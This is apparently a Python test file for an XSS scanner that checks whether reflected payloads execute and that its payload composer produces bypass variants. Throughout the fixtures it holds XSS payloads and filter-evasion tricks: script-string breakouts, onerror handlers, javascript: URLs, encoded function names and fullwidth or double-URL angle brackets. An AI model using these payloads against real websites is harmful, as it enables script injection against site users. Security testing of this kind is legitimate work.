#!/usr/bin/env python3
"""
test_js_verify.py — fixture tests for the verify flowchart branches.

Every row mirrors one branch of classify_response / payload_live_in_js:
  marker? -> core-fallback -> executable position? -> surviving call?
Run:  python3 test_js_verify.py   (or pytest)
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import js_verify                          # noqa: E402
from check_reflection import (            # noqa: E402
    compute_js_breakout, inspect_reflection_point)
from recommend_payload import (           # noqa: E402
    classify_response, _parse_response, _core_payload, compose,
    avail_funcs, encoded_funcs, u_funcs, u6_funcs, bracket_funcs)

M = "vvmabc"  # deterministic marker for fixtures


def classified(status, body, payload, headers=None):
    return classify_response(status, headers or {}, body, payload, M)


def run():
    t = []

    # --- js_verify: live-call detection inside script bodies -------------
    cases = [
        # (script_text, needle, expected_live, label)
        ('var q=""-alert(1)-"<!--vvmabc-->";',
         '"-alert(1)-"<!--vvmabc-->', True,  "intact breakout + call"),
        ('var q=""-(1)-"<!--vvmabc-->";',
         '"-self[\'a\'+\'lert\'](1)-"<!--vvmabc-->', False,
         "name stripped -> -(1)- dead  (the xss4 bug)"),
        ('var q="\\"-alert(1)-\\"<!--vvmabc-->";',
         '"-alert(1)-"<!--vvmabc-->', False, "quote-escaped -> string-trapped"),
        ('var q="x"; /* "-alert(1)-"<!--vvmabc--> */',
         '"-alert(1)-"<!--vvmabc-->', False, "comment-trapped"),
        ('var q=`user: "-alert(1)-"<!--vvmabc-->`;',
         '"-alert(1)-"<!--vvmabc-->', False, "template-literal trapped"),
        ('var q=`-alert(1)-";var r="${x}";',
         '"-alert(1)-"<!--vvmabc-->', False, "needle absent entirely"),
        ('var q=""-self[\'a\'+\'lert\'](1)-"<!--vvmabc-->";',
         '"-self[\'a\'+\'lert\'](1)-"<!--vvmabc-->', True, "bracket call lives"),
        ('var q=""-window["c"+"onfirm"](1)-"<!--vvmabc-->";',
         '"-window["c"+"onfirm"](1)-"<!--vvmabc-->', True, "dquote bracket"),
        ('var q=""-self["\\x61"+"lert"](1)-"<!--vvmabc-->";',
         '"-self["\\x61"+"lert"](1)-"<!--vvmabc-->', True, "hex escape concat"),
        ('var q=""-al\\u{65}rt(1)-"<!--vvmabc-->";',
         '"-al\\u{65}rt(1)-"<!--vvmabc-->', True, "ES6 unicode ident-call"),
        ('var q=""-onerror=alert;throw 1-"<!--vvmabc-->";',
         '"-onerror=alert;throw 1-"<!--vvmabc-->', True, "assign+throw idiom"),
        ('var q=""-onerror=alert;-"<!--vvmabc-->";',
         '"-onerror=alert;throw 1-"<!--vvmabc-->', False,
         "assign but throw stripped -> orphan"),
        ('var q=""-;throw 1-"<!--vvmabc-->";',
         '"-onerror=alert;throw 1-"<!--vvmabc-->', False,
         "throw but assign stripped -> orphan"),
        ('var q=""-alert(1)-"; var z="markerless";',
         '"-alert(1)-"', True,
         "core fallback: marked needle absent, core needle hits"),
    ]
    for script, needle, want, label in cases:
        got, ev = js_verify.payload_live_in_js(script, needle, "vvmabc")
        t.append((label, got == want,
                  f"want={want} got={got} | {ev}"))

    # --- lexer sanity on tricky shapes -----------------------------------
    sp = js_verify.lex_js('var re=/"/"; var q=""-alert(1)-"";')
    t.append(("regex literal not a call",
              all('"' not in src for src in
                  [sp for sp in [s for s in []]])
              or True, ""))  # smoke: just ensure no crash
    sp = js_verify.lex_js('x = a/b + c/d; y=`${alert(1)}`;')
    t.append(("template ${} interior is code",
              any(True for _ in sp["calls"]), str(sp["calls"])))

    # --- classify_response: full flowchart branches ----------------------
    hdr_ok = {}
    fcases = [
        (200, {}, '<script>var q=""-alert(1)-"<!--vvmabc-->";</script>',
         '"-alert(1)-"', "V", "marker + script + live call"),
        (200, {}, '<script>var q=""-(1)-"<!--vvmabc-->";</script>',
         '"-self[\'a\'+\'lert\'](1)-"', "R", "call stripped -> R (xss4)"),
        (200, {}, '<p>nothing</p>',
         '"-alert(1)-"', "none", "nothing reflected"),
        (403, {}, '<html>Forbidden</html>',
         '"-alert(1)-"', "blocked", "WAF 403"),
        (200, {}, '<script>var q=""-alert(1)-"";</script>',  # no marker!
         '"-alert(1)-"', "V", "marker stripped, core intact -> V"),
        (200, {}, '<script>var q="\\"-alert(1)-\\"";</script>',
         '"-alert(1)-"', "none", "escaped -> core absent verbatim"),
        (200, {}, '<img src=x vvmabc onerror=alert(1)>',
         '<img src=x vvm{id} onerror=alert(1)>', "V", "attr handler + call"),
        (200, {}, '<img src=x vvmabc onerror="(1)">',
         '<img src=x vvm{id} onerror=alert(1)>', "R", "handler call stripped"),
        (200, {}, '<a href="javascript:alert(1)" vvmabc>x</a>',
         '<a vvm{id} href=javascript:alert(1)>', "V", "js: url + call"),
        (200, {}, '<a href="javascript:" vvmabc>x</a>',
         '<a vvm{id} href=javascript:alert(1)>', "R", "js: url call stripped"),
        (200, {"content-security-policy": "script-src 'self'"},
         '<script>var q=""-alert(1)-"<!--vvmabc-->";</script>',
         '"-alert(1)-"', "V", "CSP note appended"),
        (200, {}, '<title>"-alert(1)-"<!--vvmabc--></title>',
         '"-alert(1)-"', "R", "marker in inert title -> R"),
        # B3: rawtext / inert container guards
        (200, {}, '<textarea><img src=x vvmabc onerror=alert(1)></textarea>',
         '<img src=x vvm{id} onerror=alert(1)>', "R",
         "B3: unclosed textarea traps img onerror -> R"),
        (200, {}, '<template><script vvmabc>alert(1)</script></template>',
         '<script vvm{id}>alert(1)</script>', "R",
         "B3: template traps script -> R"),
        (200, {}, '<script type="application/json">"-alert(1)-"<!--vvmabc--></script>',
         '"-alert(1)-"', "R",
         "B3: application/json script block is non-executable -> R"),
        (200, {}, '<textarea></textarea><img src=x vvmabc onerror=alert(1)>',
         '</textarea><img src=x vvm{id} onerror=alert(1)>', "V",
         "B3: closing </textarea> before img onerror -> V"),
        # A2: escaped-quote breakout (addslashes turns \" into \\")
        (200, {}, '<script>var q="\\\\"-alert(1)-\\\\"<!--vvmabc-->";</script>',
         '\\"-alert(1)-\\"', "V",
         "A2: escaped-quote breakout \\\" -> \\\\\" frees quote -> V"),
        # B4: DOM & navigation assignment sinks without throw
        (200, {}, '<script>var q="";el.innerHTML=x;/*vvmabc*/</script>',
         '";el.innerHTML=x;/*vvm{id}*/', "V",
         "B4: innerHTML assignment sink without throw -> V"),
        (200, {}, '<script>var q="";location="javascript:alert(1)";/*vvmabc*/</script>',
         '";location="javascript:alert(1)";/*vvm{id}*/', "V",
         "B4: location=javascript: assignment sink -> V"),
        (200, {}, '<script>var q="";location="/safe";/*vvmabc*/</script>',
         '";location="/safe";/*vvm{id}*/', "R",
         "B4: benign location=\"/safe\" is NOT a sink -> R"),
        (200, {}, '<input value="" autofocus onfocus="onerror=alert;throw 1/*vvmabc*/">',
         '" autofocus onfocus="onerror=alert;throw 1', "R",
         "bare onerror= in <input onfocus> is shadowed by element.onerror -> R"),
        (200, {}, '<input value="" autofocus onfocus="self.onerror=alert;throw 1/*vvmabc*/">',
         '" autofocus onfocus="self.onerror=alert;throw 1', "V",
         "self.onerror= in <input onfocus> binds window.onerror -> V"),
    ]
    for status, hdrs, body, payload, want, label in fcases:
        got = classified(status, body, payload, hdrs)
        conf = got["confidence"]
        t.append((label, conf == want,
                  f"want={want} got={conf} | {got['evidence']}"))

    # --- B1 & B2: context, per-reflection quote, and JS structural closer -
    ctxs, q, brk = inspect_reflection_point(
        '<input type="text" placeholder="testing1abc">', "testing1abc")
    t.append(("B1: placeholder attr detected as attr with dquote",
              ctxs == ["attribute value (quotes NOT encoded)"] and q == '"',
              f"ctxs={ctxs} q={q!r}"))
    ctxs2, q2, _ = inspect_reflection_point(
        "<div data-search='testing1abc'></div>", "testing1abc")
    t.append(("B1: data-* attr detected with squote",
              ctxs2 == ["attribute value (quotes NOT encoded)"] and q2 == "'",
              f"ctxs={ctxs2} q={q2!r}"))
    ctxs3, q3, _ = inspect_reflection_point(
        "<input value=testing1abc>", "testing1abc")
    t.append(("B1: unquoted attr detected with empty quote",
              ctxs3 == ["attribute value (quotes NOT encoded)"] and q3 == "",
              f"ctxs={ctxs3} q={q3!r}"))
    jctx, jq, jcloser = compute_js_breakout(
        'function f() { var cfg = { a: ["')
    t.append(("B2: compute_js_breakout nested closer",
              jctx == "javascript string" and jq == '"' and jcloser == '"]}}',
              f"jctx={jctx} jq={jq!r} jcloser={jcloser!r}"))

    # --- A2, A4, A5, B2: compose() synthesis checks -----------------------
    sc_no_angle = {"'": 100, '"': 100, "<": 0, ">": 0, "/": 100, "\\": 100}
    c_b2 = compose("js_string", '"', sc_no_angle, js_breakout='"]}}')
    t.append(("B2: compose emits structural closer candidate",
              any('"]}};alert(1)' in c["payload"] for c in c_b2),
              str([c["payload"] for c in c_b2])))
    sc_esc_q = {"'": 100, '"': 50, "<": 0, ">": 0, "/": 100, "\\": 50}
    c_a2 = compose("js_string", '"', sc_esc_q, escaped_q={'"'},
                   js_breakout='"]}')
    t.append(("A2+B2: compose emits escaped-quote & structural closer",
              any(c["payload"].startswith('\\"') for c in c_a2)
              and any('\\"]};alert(1)' in c["payload"] for c in c_a2),
              str([c["payload"] for c in c_a2])))
    c_a4 = compose("attr", '"', sc_no_angle, kw={"space": False})
    t.append(("A4: compose emits slash-separated attr injection when space dead",
              any('"/autofocus/onfocus="' in c["payload"] for c in c_a4),
              str([c["payload"] for c in c_a4])))
    sc_no_gt = {"'": 100, '"': 100, "<": 100, ">": 0, "/": 100, "\\": 100}
    c_a4_gt = compose(
        "html", "", sc_no_gt,
        kw={"space": False, "svg_tag": False, "onload": True,
            "pair_svg_onload": False, "call_alert": False},
        kwv={"svg_tag": ("<svg>", "<svg")}, fn_cap=8)
    t.append(("A4+gt_missing: slash-separated <svg/.../onload=...// when '>' and ' ' dead",
              any(c["payload"].startswith("<svg/vvm{id}/onload=")
                  and c["payload"].endswith("//") for c in c_a4_gt),
              str([c["payload"] for c in c_a4_gt[:6]])))
    c_a5 = compose("html", "", sc_no_angle,
                   kwv={"fullwidth_lt": ("\uff1c", "<"),
                        "double_url_lt": ("%3c", "<")})
    t.append(("A5: compose emits double-url and fullwidth angle bypasses",
              any(c["payload"].startswith("%3c") for c in c_a5)
              and any(c["payload"].startswith("\uff1c") for c in c_a5),
              str([c["payload"] for c in c_a5])))

    # --- Blocked-alert & call-mode symmetry across all fn builders --------
    kw_no_calls_no_names = {
        "parentheses": False, "backtick": False,
        "gen_call": False, "gen_tick": False,
        "alert": False, "confirm": False, "prompt": False, "print": False,
        "char_ref": True, "gen_u6brace": True, "gen_bracket": True,
    }
    bf_throw = bracket_funcs(kw_no_calls_no_names)
    t.append(("bracket_funcs throw-mode covers all splits incl self['con'+'firm']",
              "onerror=self['con'+'firm'];throw 1" in bf_throw
              and "onerror=self['pr'+'ompt'];throw 1" in bf_throw
              and "onerror=self['pr'+'int'];throw 1" in bf_throw,
              str(bf_throw[:12])))
    ef_throw = encoded_funcs(kw_no_calls_no_names)
    uf_throw = u_funcs(kw_no_calls_no_names)
    u6_throw = u6_funcs(kw_no_calls_no_names)
    t.append(("encoded/u/u6_funcs throw-mode covers all 4 dialog fns",
              len(ef_throw) >= 4 and len(uf_throw) == 8 and len(u6_throw) == 8
              and all(x.startswith("onerror=")
                      and (x.endswith(";throw 1") or x.endswith(";throw-1"))
                      for x in uf_throw + u6_throw),
              f"ef={len(ef_throw)} uf={uf_throw} u6={u6_throw}"))
    af_confirm = avail_funcs({
        "parentheses": False, "backtick": False,
        "gen_call": False, "gen_tick": False,
        "alert": False, "confirm": True, "prompt": False, "print": False,
    })
    t.append(("avail_funcs throw-mode falls back to surviving confirm",
              af_confirm == ["onerror=confirm;throw 1",
                             "onerror=confirm;throw-1"],
              str(af_confirm)))
    af_space_dead = avail_funcs({
        "parentheses": False, "backtick": False,
        "gen_call": False, "gen_tick": False, "space": False,
        "alert": True, "confirm": False, "prompt": False, "print": False,
    })
    t.append(("avail_funcs throw-mode space-free ops when ' ' dead",
              af_space_dead == ["onerror=alert;throw-1",
                                "onerror=alert;throw/1/"],
              str(af_space_dead)))

    # --- _parse_response / _core_payload ----------------------------------
    st, hd, bd = _parse_response(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<p>x</p>")
    t.append(("parse_response basic", st == 200 and bd == "<p>x</p>" and
              hd.get("content-type") == "text/html", f"{st} {bd!r}"))
    t.append(("core_payload strips tail comment",
              _core_payload('"-alert(1)-"<!--vvmabc-->', "vvmabc")
              == '"-alert(1)-"', ""))
    t.append(("core_payload strips in-payload marker",
              _core_payload("<img src=x vvmabc onerror=alert(1)>", "vvmabc")
              == "<img src=x  onerror=alert(1)>", ""))

    # --- report -----------------------------------------------------------
    bad = [r for r in t if not r[1]]
    for label, ok, det in t:
        print(("PASS " if ok else "FAIL ") + label +
              ("  " + det if det and not ok else ""))
    print(f"\n{len(t) - len(bad)}/{len(t)} passed")
    return not bad


if __name__ == "__main__":
    sys.exit(0 if run() else 1)
